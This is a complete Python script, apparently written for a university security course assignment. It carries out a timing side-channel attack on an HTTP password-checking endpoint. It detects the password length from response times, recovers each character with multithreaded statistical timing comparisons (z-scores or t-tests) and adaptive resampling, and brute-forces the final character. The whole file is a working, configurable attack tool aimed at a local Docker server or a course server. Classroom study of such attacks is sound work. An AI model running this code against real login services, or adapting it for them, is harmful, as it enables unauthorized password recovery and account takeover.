#!/usr/bin/env python3
"""
Timing Side-Channel Attack Script
==================================
Exploits character-by-character password comparison timing differences
to crack passwords through statistical analysis of response times.

Author: df
Course: Attacks on Implementations of Secure Systems
Assignment: Homework 1 - Temporal Side-Channel
"""

import argparse
import requests
import statistics
import time
import logging
from typing import List, Tuple, Dict, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
import sys
from scipy import stats  # For t-test


# ============================================================================
# CONFIGURATION CONSTANTS
# ============================================================================

# Default values
DEFAULT_USERNAME = "316279942"  # Replace with your student ID
DEFAULT_DIFFICULTY = 1
DEFAULT_SERVER = "http://127.0.0.1"
DEFAULT_PORT = 80

# Timing attack parameters (increased for local Docker)
DEFAULT_BASE_SAMPLES = 4       # Initial number of timing samples per character (was 30)
DEFAULT_THREADS = 6             # Number of parallel threads (1 for accurate timing, increase for speed)
MAX_PASSWORD_LENGTH = 32        # Maximum password length to test
LENGTH_DETECTION_SAMPLES = 4   # Samples for length detection (was 25)

# Statistical thresholds (adjusted for local Docker with small timing differences)
HIGH_CONFIDENCE_ZSCORE = 1.8    # Z-score threshold for high confidence (lowered from 2.5)
MEDIUM_CONFIDENCE_ZSCORE = 0.8  # Z-score threshold for medium confidence (lowered from 1.5)
MEDIUM_ADDITIONAL_SAMPLES = 4  # Additional samples for medium confidence (increased from 20)
LOW_ADDITIONAL_SAMPLES = 4     # Additional samples for low confidence (increased from 40)

# Character set
CHARSET = "abcdefghijklmnopqrstuvwxyz"

# Statistical test method
DEFAULT_STAT_TEST = "z-score"  # Options: "z-score" or "t-test"

# Backtracking parameters
MAX_BACKTRACK_DEPTH = 3         # Maximum number of positions to backtrack
TOP_CANDIDATES_TO_KEEP = 3      # Number of top candidates to store per position

# Request timeout
REQUEST_TIMEOUT = 80            # Seconds


# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class TimingResult:
    """Stores timing measurement results for a character guess."""
    character: str
    median: float
    std_dev: float
    samples: int
    z_score: float = 0.0
    raw_timings: List[float] = field(default_factory=list)  # Store actual timing measurements
    average: float = 0.0  # Average (mean) timing


@dataclass
class PositionResult:
    """Stores the cracking result for a specific password position."""
    position: int
    character: str
    confidence: str  # 'HIGH', 'MEDIUM', 'LOW'
    timing_result: TimingResult
    candidates: List[TimingResult]


# ============================================================================
# LOGGING SETUP
# ============================================================================

def setup_logging(username: str) -> str:
    """
    Setup logging configuration for both file and console output.

    Args:
        username: Username being attacked (for log filename)

    Returns:
        Path to the log file
    """
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = f"timing_attack_{username}_{timestamp}.log"

    # File handler - detailed logs
    file_handler = logging.FileHandler(log_filename)
    file_handler.setLevel(logging.DEBUG)
    file_formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    file_handler.setFormatter(file_formatter)

    # Console handler - minimal output
    console_handler = logging.StreamHandler(sys.stderr)
    console_handler.setLevel(logging.INFO)
    console_formatter = logging.Formatter('%(message)s')
    console_handler.setFormatter(console_formatter)

    # Setup root logger
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)

    # Suppress DEBUG logs from requests and urllib3 libraries
    logging.getLogger('urllib3').setLevel(logging.WARNING)
    logging.getLogger('requests').setLevel(logging.WARNING)

    return log_filename


# ============================================================================
# HTTP REQUEST FUNCTIONS
# ============================================================================

def create_session() -> requests.Session:
    """
    Create a requests session with optimized settings for timing attacks.

    Returns:
        Configured requests.Session object
    """
    session = requests.Session()
    # Keep connection alive for better timing consistency
    session.headers.update({'Connection': 'keep-alive'})
    return session


def measure_request_time(
    session: requests.Session,
    url: str,
    username: str,
    password: str,
    difficulty: int
) -> float:
    """
    Measure the time taken for a single password check request.

    Args:
        session: Requests session to use
        url: Base URL of the password checking server
        username: Username to test
        password: Password to test
        difficulty: Difficulty level

    Returns:
        Request time in seconds, or float('inf') on error
    """
    params = {
        'user': username,
        'password': password,
        'difficulty': difficulty
    }

    try:
        start_time = time.perf_counter()
        response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)
        elapsed_time = time.perf_counter() - start_time

        # Log if we get an unexpected response
        if response.status_code != 200:
            logging.warning(f"Unexpected status code {response.status_code} for password: {password}")

        return elapsed_time

    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed for password '{password}': {e}")
        return float('inf')


def time_request(
    session: requests.Session,
    url: str,
    username: str,
    password: str,
    difficulty: int,
    samples: int
) -> Tuple[float, float, List[float], float]:
    """
    Perform multiple timing measurements and calculate statistics.

    Args:
        session: Requests session to use
        url: Base URL of the password checking server
        username: Username to test
        password: Password to test
        difficulty: Difficulty level
        samples: Number of samples to collect

    Returns:
        Tuple of (median_time, std_dev, all_timings, average_time)
    """
    timings = []

    for _ in range(samples):
        timing = measure_request_time(session, url, username, password, difficulty)
        if timing != float('inf'):
            timings.append(timing)

    if not timings:
        logging.error(f"All requests failed for password: {password}")
        return (float('inf'), float('inf'), [], float('inf'))

    median = statistics.median(timings)
    std_dev = statistics.stdev(timings) if len(timings) > 1 else 0.0
    average = statistics.mean(timings)

    return (median, std_dev, timings, average)


# ============================================================================
# STATISTICAL ANALYSIS
# ============================================================================

def calculate_z_score(value: float, population: List[float]) -> float:
    """
    Calculate the z-score of a value relative to a population.

    Args:
        value: The value to calculate z-score for
        population: List of all values in the population

    Returns:
        Z-score (number of standard deviations from mean)
    """
    if len(population) < 2:
        return 0.0

    mean = statistics.mean(population)
    std_dev = statistics.stdev(population)

    if std_dev == 0:
        return 0.0

    return (value - mean) / std_dev


def calculate_t_test_score(winner_timings: List[float], other_timings: List[float]) -> float:
    """
    Calculate t-test score comparing winner's timings against all other timings.
    Higher positive value = winner is significantly slower (more likely correct).

    Args:
        winner_timings: Raw timing measurements for the winning character
        other_timings: Raw timing measurements for all other characters combined

    Returns:
        T-test statistic (positive = winner is slower)
    """
    if len(winner_timings) < 2 or len(other_timings) < 2:
        return 0.0

    # Perform independent samples t-test
    # We expect winner to be SLOWER (higher values), so we check if winner > others
    t_statistic, p_value = stats.ttest_ind(winner_timings, other_timings)

    # Return t-statistic (positive = winner is significantly slower)
    return t_statistic


def analyze_timing_results(
    results: List[TimingResult],
    test_method: str = "z-score"
) -> List[TimingResult]:
    """
    Analyze timing results and calculate statistical scores for each character.

    Args:
        results: List of TimingResult objects
        test_method: "z-score" or "t-test"

    Returns:
        List of TimingResult objects sorted by median time (descending)
        with statistical scores calculated
    """
    # Extract all median values
    medians = [r.median for r in results if r.median != float('inf')]

    if not medians:
        return results

    if test_method == "t-test":
        # For t-test, we need to compare each character's raw timings against all others
        # Sort by median first
        results_sorted = sorted(results, key=lambda r: r.median, reverse=True)

        # Calculate t-test for the winner against all others
        if len(results_sorted) > 1:
            winner = results_sorted[0]

            # Collect all raw timings from non-winner characters
            other_timings = []
            for r in results_sorted[1:]:
                if r.raw_timings and r.median != float('inf'):
                    other_timings.extend(r.raw_timings)

            if winner.raw_timings and other_timings:
                winner.z_score = calculate_t_test_score(winner.raw_timings, other_timings)

            # For other characters, calculate t-test against the winner
            for r in results_sorted[1:]:
                if r.raw_timings and winner.raw_timings:
                    # Negative t-score since they're slower than winner
                    r.z_score = -calculate_t_test_score(winner.raw_timings, r.raw_timings)

        return results_sorted

    else:  # z-score (default)
        # Calculate z-scores for each result
        for result in results:
            if result.median != float('inf'):
                result.z_score = calculate_z_score(result.median, medians)

        # Sort by median time (descending - slower is more likely correct)
        results_sorted = sorted(results, key=lambda r: r.median, reverse=True)

        return results_sorted


# ============================================================================
# PASSWORD LENGTH DETECTION
# ============================================================================

def detect_password_length(
    session: requests.Session,
    url: str,
    username: str,
    difficulty: int,
    max_length: int = MAX_PASSWORD_LENGTH,
    samples: int = LENGTH_DETECTION_SAMPLES
) -> int:
    """
    Detect the password length by testing different lengths.
    The correct length will take longest to fail (more characters compared).

    Args:
        session: Requests session to use
        url: Base URL of the server
        username: Username to test
        difficulty: Difficulty level
        max_length: Maximum length to test
        samples: Number of samples per length

    Returns:
        Detected password length
    """
    logging.info("[*] Detecting password length...")

    length_timings = {}

    def test_length(length: int) -> Tuple[int, float]:
        """Test a specific password length."""
        # Create a password of wrong characters with the specified length
        test_password = 'z' * length
        median, _, _, _ = time_request(session, url, username, test_password, difficulty, samples)
        return (length, median)

    # Test all lengths in parallel
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(test_length, length): length
                  for length in range(1, max_length + 1)}

        for future in as_completed(futures):
            length, median = future.result()
            length_timings[length] = median
            logging.debug(f"  Length {length:2d}: {median:.6f}s")

    # Find the length with the maximum median time
    detected_length = max(length_timings, key=length_timings.get)
    max_time = length_timings[detected_length]

    # Show top 5 lengths for analysis
    sorted_lengths = sorted(length_timings.items(), key=lambda x: x[1], reverse=True)
    logging.info(f"[+] Password length detected: {detected_length} characters "
                f"(timing: {max_time:.6f}s)")
    logging.info(f"  Top 5 length candidates:")
    for length, timing in sorted_lengths[:5]:
        logging.info(f"    Length {length:2d}: {timing:.6f}s")

    # Sanity check: if multiple lengths are very close, warn about uncertainty
    second_best_time = sorted_lengths[1][1] if len(sorted_lengths) > 1 else 0
    if max_time - second_best_time < 0.01:  # Less than 10ms difference
        logging.warning(f"[!] Length detection has low confidence - "
                       f"difference between top two: {max_time - second_best_time:.6f}s")
        logging.warning(f"[!] If cracking fails, the password length might be wrong.")

    return detected_length


# ============================================================================
# CHARACTER TESTING
# ============================================================================

def test_character(
    url: str,
    username: str,
    known_prefix: str,
    char: str,
    difficulty: int,
    samples: int,
    password_length: int  # CRITICAL: Need total password length for padding
) -> TimingResult:
    """
    Test a single character at the current position.
    Creates its own session to ensure thread safety.

    Args:
        url: Base URL of the server
        username: Username to test
        known_prefix: Already cracked password prefix
        char: Character to test
        difficulty: Difficulty level
        samples: Number of timing samples
        password_length: Total password length (for padding)

    Returns:
        TimingResult object with timing statistics
    """
    # Create a new session for this character to ensure thread safety
    session = create_session()

    # CRITICAL: Pad to full password length!
    current_length = len(known_prefix) + 1  # prefix + this character
    padding_needed = password_length - current_length
    test_password = known_prefix + char + ('a' * padding_needed)

    logging.debug(f"Testing char '{char}': password='{test_password}' (prefix='{known_prefix}', padding={'a'*padding_needed})")

    median, std_dev, raw_timings, average = time_request(session, url, username, test_password, difficulty, samples)
    session.close()  # Clean up

    return TimingResult(
        character=char,
        median=median,
        std_dev=std_dev,
        samples=samples,
        raw_timings=raw_timings,  # Store the actual timings!
        average=average  # Store the average
    )


def test_all_characters(
    url: str,
    username: str,
    known_prefix: str,
    difficulty: int,
    samples: int,
    threads: int,
    password_length: int  # CRITICAL: Need for padding
) -> List[TimingResult]:
    """
    Test all characters in the charset at the current position using parallel threads.
    Each thread creates its own session for thread safety.

    Args:
        url: Base URL of the server
        username: Username to test
        known_prefix: Already cracked password prefix
        difficulty: Difficulty level
        samples: Number of timing samples per character
        threads: Number of parallel threads
        password_length: Total password length (for padding)

    Returns:
        List of TimingResult objects for all characters
    """
    results = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(
                test_character,
                url, username, known_prefix, char, difficulty, samples, password_length
            ): char
            for char in CHARSET
        }

        for future in as_completed(futures):
            result = future.result()
            results.append(result)

    return results


# ============================================================================
# CHARACTER CRACKING WITH ADAPTIVE SAMPLING
# ============================================================================

def crack_character_at_position(
    url: str,
    username: str,
    known_prefix: str,
    position: int,
    difficulty: int,
    base_samples: int,
    threads: int,
    password_length: int,  # CRITICAL: Need for padding
    test_method: str = "z-score"  # "z-score" or "t-test"
) -> PositionResult:
    """
    Crack a single character at the specified position with adaptive sampling.

    Args:
        url: Base URL of the server
        username: Username to test
        known_prefix: Already cracked password prefix
        position: Current position (0-indexed)
        difficulty: Difficulty level
        base_samples: Initial number of samples
        threads: Number of parallel threads
        password_length: Total password length (for padding)
        test_method: "z-score" or "t-test"

    Returns:
        PositionResult with the cracked character and confidence level
    """
    # Show progress
    current_display = known_prefix if known_prefix else "[empty]"
    logging.info(f"\n[Position {position + 1}] Current password: '{current_display}' - Testing next character...")
    logging.info(f"  Statistical test method: {test_method}")

    # Initial testing with base samples
    results = test_all_characters(
        url, username, known_prefix, difficulty, base_samples, threads, password_length
    )

    # Analyze results and calculate statistical scores
    results = analyze_timing_results(results, test_method)

    winner = results[0]
    winner_score = winner.z_score  # Using z_score field for both z-score and t-score
    score_name = "t-score" if test_method == "t-test" else "z-score"

    # Display ALL 26 characters with their timings
    logging.info(f"  ALL character timings ({base_samples} samples each):")
    for i, r in enumerate(results):
        rank_symbol = f"#{i+1:2d}"
        # Show summary statistics
        logging.info(f"    {rank_symbol} '{r.character}': median={r.median:.6f}s, avg={r.average:.6f}s, {score_name}={r.z_score:+.2f}, std_dev={r.std_dev:.6f}s")
        # Show all raw timing measurements
        timings_str = ', '.join([f'{t:.6f}' for t in r.raw_timings])
        logging.debug(f"         Raw timings: [{timings_str}]")

    logging.info(f"")
    logging.info(f"  Top candidate: '{winner.character}' ({score_name}={winner_score:.2f})")

    # Determine confidence and adaptive sampling
    if winner_score > HIGH_CONFIDENCE_ZSCORE:
        confidence = "HIGH"
        logging.info(f"[+] Found: '{winner.character}' "
                    f"(median={winner.median:.6f}s, {score_name}={winner_score:.2f}) [HIGH]")

    elif winner_score > MEDIUM_CONFIDENCE_ZSCORE:
        confidence = "MEDIUM"
        logging.info(f"[~] Candidate: '{winner.character}' "
                    f"(median={winner.median:.6f}s, {score_name}={winner_score:.2f}) [MEDIUM] - verifying...")

        # Take additional samples for top 3 candidates
        top_candidates = results[:3]
        refined_results = []

        logging.info(f"  Taking {MEDIUM_ADDITIONAL_SAMPLES} more samples for top 3 candidates...")

        for candidate in top_candidates:
            logging.info(f"    Testing '{candidate.character}' (initial: median={candidate.median:.6f}s, {score_name}={candidate.z_score:.2f})...")

            additional_result = test_character(
                url, username, known_prefix, candidate.character,
                difficulty, MEDIUM_ADDITIONAL_SAMPLES, password_length
            )

            logging.info(f"      -> New measurement: median={additional_result.median:.6f}s ({MEDIUM_ADDITIONAL_SAMPLES} samples)")

            # Combine ACTUAL raw timings (not repeated medians!)
            total_samples = candidate.samples + additional_result.samples
            all_timings = candidate.raw_timings + additional_result.raw_timings
            combined_median = statistics.median(all_timings)
            combined_std_dev = statistics.stdev(all_timings) if len(all_timings) > 1 else 0.0
            combined_average = statistics.mean(all_timings)

            logging.info(f"      -> Combined: median={combined_median:.6f}s, avg={combined_average:.6f}s ({total_samples} total samples)")

            refined_result = TimingResult(
                character=candidate.character,
                median=combined_median,
                std_dev=combined_std_dev,
                samples=total_samples,
                raw_timings=all_timings,  # Keep the combined raw timings
                average=combined_average
            )
            refined_results.append(refined_result)

        # Re-analyze with combined samples
        results = analyze_timing_results(refined_results + results[3:], test_method)
        winner = results[0]
        winner_score = winner.z_score

        logging.info(f"")
        logging.info(f"  After re-analysis, top 3 candidates:")
        for i, r in enumerate(results[:3]):
            logging.info(f"    #{i+1} '{r.character}': median={r.median:.6f}s, {score_name}={r.z_score:.2f}, samples={r.samples}")

        logging.info(f"[+] Confirmed: '{winner.character}' "
                    f"(median={winner.median:.6f}s, {score_name}={winner_score:.2f}) [CONFIRMED]")

    else:
        confidence = "LOW"
        logging.warning(f"[!] Low confidence: '{winner.character}' "
                       f"(median={winner.median:.6f}s, {score_name}={winner_score:.2f}) [LOW] - deep verification...")

        # Take many additional samples for top 5 candidates
        top_candidates = results[:5]
        refined_results = []

        logging.info(f"  Taking {LOW_ADDITIONAL_SAMPLES} more samples for top 5 candidates...")

        for candidate in top_candidates:
            logging.info(f"    Testing '{candidate.character}' (initial: median={candidate.median:.6f}s, {score_name}={candidate.z_score:.2f})...")

            additional_result = test_character(
                url, username, known_prefix, candidate.character,
                difficulty, LOW_ADDITIONAL_SAMPLES, password_length
            )

            logging.info(f"      -> New measurement: median={additional_result.median:.6f}s ({LOW_ADDITIONAL_SAMPLES} samples)")

            # Combine ACTUAL raw timings (not repeated medians!)
            total_samples = candidate.samples + additional_result.samples
            all_timings = candidate.raw_timings + additional_result.raw_timings
            combined_median = statistics.median(all_timings)
            combined_std_dev = statistics.stdev(all_timings) if len(all_timings) > 1 else 0.0
            combined_average = statistics.mean(all_timings)

            logging.info(f"      -> Combined: median={combined_median:.6f}s, avg={combined_average:.6f}s ({total_samples} total samples)")

            refined_result = TimingResult(
                character=candidate.character,
                median=combined_median,
                std_dev=combined_std_dev,
                samples=total_samples,
                raw_timings=all_timings,
                average=combined_average
            )
            refined_results.append(refined_result)

        # Re-analyze with combined samples
        results = analyze_timing_results(refined_results + results[5:], test_method)
        winner = results[0]
        winner_score = winner.z_score

        logging.info(f"")
        logging.info(f"  After re-analysis, top 3 candidates:")
        for i, r in enumerate(results[:3]):
            logging.info(f"    #{i+1} '{r.character}': median={r.median:.6f}s, {score_name}={r.z_score:.2f}, samples={r.samples}")

        logging.warning(f"[+] Best guess: '{winner.character}' "
                       f"(median={winner.median:.6f}s, {score_name}={winner_score:.2f})")

    # Keep top candidates for potential backtracking
    top_candidates = results[:TOP_CANDIDATES_TO_KEEP]

    return PositionResult(
        position=position,
        character=winner.character,
        confidence=confidence,
        timing_result=winner,
        candidates=top_candidates
    )


# ============================================================================
# FINAL CHARACTER BRUTE FORCE
# ============================================================================

def brute_force_final_character(
    session: requests.Session,
    url: str,
    username: str,
    known_prefix: str,
    difficulty: int
) -> Optional[str]:
    """
    Brute force the final character by trying all 26 letters and checking
    which one returns '1' (correct password).

    Args:
        session: Requests session to use
        url: Base URL of the server
        username: Username to test
        known_prefix: Already cracked password prefix (missing only last char)
        difficulty: Difficulty level

    Returns:
        The correct final character, or None if not found
    """
    logging.info(f"\n[Final Position] Brute-forcing final character...")
    logging.info(f"  Current password: '{known_prefix}' - Testing all 26 letters...")

    for char in CHARSET:
        test_password = known_prefix + char

        try:
            params = {
                'user': username,
                'password': test_password,
                'difficulty': difficulty
            }
            response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)

            logging.info(f"    Testing '{char}': response='{response.text.strip()}'")

            if '1' in response.text or response.text.strip() == '1':
                logging.info(f"  [SUCCESS] Final character found: '{char}'")
                logging.info(f"  Complete password: '{test_password}'")
                return char

        except requests.exceptions.RequestException as e:
            logging.error(f"    Request failed for character '{char}': {e}")
            continue

    logging.error(f"  [FAILED] Could not find correct final character!")
    return None


# ============================================================================
# MAIN CRACKING LOGIC
# ============================================================================

def crack_password(
    url: str,
    username: str,
    difficulty: int,
    threads: int = DEFAULT_THREADS,
    base_samples: int = DEFAULT_BASE_SAMPLES,
    manual_length: int = None,
    test_method: str = "z-score"  # "z-score" or "t-test"
) -> str:
    """
    Main function to crack the password using timing side-channel attack.

    Args:
        url: Base URL of the password checking server
        username: Username to attack
        difficulty: Difficulty level
        threads: Number of parallel threads
        base_samples: Initial number of timing samples
        manual_length: Manually specified password length (skips detection)
        test_method: Statistical test method ("z-score" or "t-test")

    Returns:
        The cracked password
    """
    session = create_session()
    start_time = time.time()

    # Phase 1: Detect password length (or use manual length)
    if manual_length:
        password_length = manual_length
        logging.info(f"[*] Using manually specified password length: {password_length}")
    else:
        password_length = detect_password_length(session, url, username, difficulty)

    # Phase 2: Crack each character (except the last one)
    logging.info(f"\n[*] Starting character-by-character cracking...")
    logging.info(f"[*] Using statistical test: {test_method}")

    position_results = []
    known_password = ""
    position = 0

    # Crack all positions except the last using timing attack
    while position < password_length - 1:  # Stop before last character
        result = crack_character_at_position(
            url, username, known_password, position,
            difficulty, base_samples, threads, password_length, test_method
        )

        position_results.append(result)
        known_password += result.character

        # Display current progress
        logging.info(f"[Progress] Password so far: '{known_password}' ({len(known_password)}/{password_length} characters)")

        # Verify character by testing if adding it increases response time
        # (optional sanity check for very low confidence results)
        if result.confidence == "LOW" and len(known_password) > 1:
            # Quick verification: test the current password vs previous password
            prev_password = known_password[:-1] + 'z'  # wrong char
            current_time, _, _, _ = time_request(session, url, username, known_password, difficulty, 10)
            wrong_time, _, _, _ = time_request(session, url, username, prev_password, difficulty, 10)

            if current_time <= wrong_time:
                logging.warning(f"[!] Sanity check: Current char '{result.character}' may be wrong "
                              f"(current: {current_time:.6f}s vs wrong: {wrong_time:.6f}s)")

        # NOTE: Backtracking disabled to prevent infinite loops with low confidence
        # On local Docker, timing differences are very small and confidence is naturally lower
        # The script will just pick the best candidate and move forward

        position += 1

    # Phase 3: Brute-force the final character
    logging.info(f"\n[*] Skipping timing attack for final character - using brute force instead")
    final_char = brute_force_final_character(session, url, username, known_password, difficulty)

    if final_char:
        known_password += final_char
        position_results.append(PositionResult(
            position=position,
            character=final_char,
            confidence="VERIFIED",
            timing_result=TimingResult(
                character=final_char,
                median=0.0,
                std_dev=0.0,
                samples=1,
                average=0.0
            ),
            candidates=[]
        ))
    else:
        logging.error(f"[!] Failed to brute-force final character!")
        # Fall back to timing attack for last character if brute force fails
        logging.info(f"[*] Falling back to timing attack for final character...")
        result = crack_character_at_position(
            url, username, known_password, position,
            difficulty, base_samples, threads, password_length, test_method
        )
        position_results.append(result)
        known_password += result.character

    # Phase 3: Verify the cracked password
    logging.info(f"\n[*] Verifying cracked password: '{known_password}'")
    test_password = known_password

    try:
        params = {
            'user': username,
            'password': test_password,
            'difficulty': difficulty
        }
        response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)

        if '1' in response.text or response.text.strip() == '1':
            logging.info(f"[SUCCESS] Password verified successfully!")
        else:
            logging.error(f"[FAILED] Password verification failed. Response: {response.text}")
            logging.error(f"[!] The cracked password '{known_password}' is incorrect.")
            logging.error(f"")
            logging.error(f"Troubleshooting suggestions:")
            logging.error(f"  1. Try with more samples: --samples 100 or --samples 150")
            logging.error(f"  2. Length might be wrong (detected: {password_length})")
            logging.error(f"     Try nearby lengths: --length {password_length-1} or --length {password_length+1}")
            logging.error(f"  3. Test on remote server instead of local Docker")
            logging.error(f"  4. Check the log file for low confidence positions")

    except Exception as e:
        logging.error(f"[FAILED] Verification request failed: {e}")

    # Calculate and log statistics
    total_time = time.time() - start_time

    # Count confidence levels
    high_conf = sum(1 for r in position_results if r.confidence == "HIGH")
    med_conf = sum(1 for r in position_results if r.confidence == "MEDIUM")
    low_conf = sum(1 for r in position_results if r.confidence == "LOW")

    logging.info(f"\n{'='*60}")
    logging.info(f"ATTACK SUMMARY")
    logging.info(f"{'='*60}")
    logging.info(f"Username:        {username}")
    logging.info(f"Difficulty:      {difficulty}")
    logging.info(f"Password Length: {password_length}")
    logging.info(f"Password Result: {known_password}")
    logging.info(f"Total Time:      {total_time:.2f} seconds ({total_time/60:.2f} minutes)")
    logging.info(f"Threads Used:    {threads}")
    logging.info(f"Base Samples:    {base_samples}")
    logging.info(f"")
    logging.info(f"Confidence Distribution:")
    logging.info(f"  HIGH:   {high_conf}/{password_length} positions ({high_conf/password_length*100:.1f}%)")
    logging.info(f"  MEDIUM: {med_conf}/{password_length} positions ({med_conf/password_length*100:.1f}%)")
    logging.info(f"  LOW:    {low_conf}/{password_length} positions ({low_conf/password_length*100:.1f}%)")

    if low_conf > password_length * 0.5:
        logging.warning(f"")
        logging.warning(f"[!] WARNING: More than 50% positions had LOW confidence!")
        logging.warning(f"[!] This typically happens on local Docker due to very small timing differences.")
        logging.warning(f"[!] Recommendations:")
        logging.warning(f"    - Increase --samples to 50-80 for better accuracy")
        logging.warning(f"    - Verify the result against the server")
        logging.warning(f"    - If incorrect, try running with --samples 80")

    logging.info(f"{'='*60}")

    # Log per-position details
    logging.info(f"\n{'='*60}")
    logging.info(f"PER-POSITION DETAILED RESULTS")
    logging.info(f"{'='*60}")
    for result in position_results:
        logging.info(f"Position {result.position + 1:2d}: '{result.character}' | "
                    f"Confidence: {result.confidence:8s} | "
                    f"Z-score: {result.timing_result.z_score:5.2f} | "
                    f"Median: {result.timing_result.median:.6f}s | "
                    f"Samples: {result.timing_result.samples}")
    logging.info(f"{'='*60}")

    return known_password


# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def parse_arguments() -> argparse.Namespace:
    """
    Parse command line arguments.

    Returns:
        Parsed arguments namespace
    """
    parser = argparse.ArgumentParser(
        description="Timing Side-Channel Attack on Password Verification",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python timing_attack.py --username 123456789
  python timing_attack.py --username 123456789 --difficulty 2 --threads 8
  python timing_attack.py --server http://132.72.81.37 --username 123456789
        """
    )

    parser.add_argument(
        '--username',
        type=str,
        default=DEFAULT_USERNAME,
        help=f'Username (student ID) to attack (default: {DEFAULT_USERNAME})'
    )

    parser.add_argument(
        '--difficulty',
        type=int,
        default=DEFAULT_DIFFICULTY,
        help=f'Difficulty level (default: {DEFAULT_DIFFICULTY})'
    )

    parser.add_argument(
        '--server',
        type=str,
        default=DEFAULT_SERVER,
        help=f'Server URL (default: {DEFAULT_SERVER})'
    )

    parser.add_argument(
        '--port',
        type=int,
        default=DEFAULT_PORT,
        help=f'Server port (default: {DEFAULT_PORT})'
    )

    parser.add_argument(
        '--threads',
        type=int,
        default=DEFAULT_THREADS,
        help=f'Number of parallel threads (default: {DEFAULT_THREADS})'
    )

    parser.add_argument(
        '--samples',
        type=int,
        default=DEFAULT_BASE_SAMPLES,
        help=f'Base number of timing samples per character (default: {DEFAULT_BASE_SAMPLES})'
    )

    parser.add_argument(
        '--length',
        type=int,
        default=None,
        help='Manually specify password length (skip auto-detection)'
    )

    parser.add_argument(
        '--test-method',
        type=str,
        default=DEFAULT_STAT_TEST,
        choices=['z-score', 't-test'],
        help=f'Statistical test method: z-score or t-test (default: {DEFAULT_STAT_TEST})'
    )

    return parser.parse_args()


def main():
    """Main entry point for the script."""
    # Fix Windows console encoding issues
    import sys
    import io
    if sys.platform == 'win32':
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

    args = parse_arguments()

    # Construct full URL
    url = f"{args.server}:{args.port}" if args.port != 80 else args.server
    if not url.startswith('http'):
        url = f"http://{url}"

    # Setup logging
    log_file = setup_logging(args.username)

    logging.info("="*60)
    logging.info("TIMING SIDE-CHANNEL ATTACK")
    logging.info("="*60)
    logging.info(f"Target URL:  {url}")
    logging.info(f"Username:    {args.username}")
    logging.info(f"Difficulty:  {args.difficulty}")
    logging.info(f"Threads:     {args.threads}")
    logging.info(f"Samples:     {args.samples}")
    logging.info(f"Test Method: {args.test_method}")
    logging.info(f"Log file:    {log_file}")
    logging.info("="*60 + "\n")

    try:
        # Run the attack
        password = crack_password(
            url=url,
            username=args.username,
            difficulty=args.difficulty,
            threads=args.threads,
            base_samples=args.samples,
            manual_length=args.length,
            test_method=args.test_method
        )

        # Output ONLY the password to stdout (for grading)
        print(password)

    except KeyboardInterrupt:
        logging.error("\n[!] Attack interrupted by user")
        sys.exit(1)

    except Exception as e:
        logging.error(f"\n[!] Unexpected error: {e}")
        logging.exception("Full traceback:")
        sys.exit(1)


if __name__ == "__main__":
    main()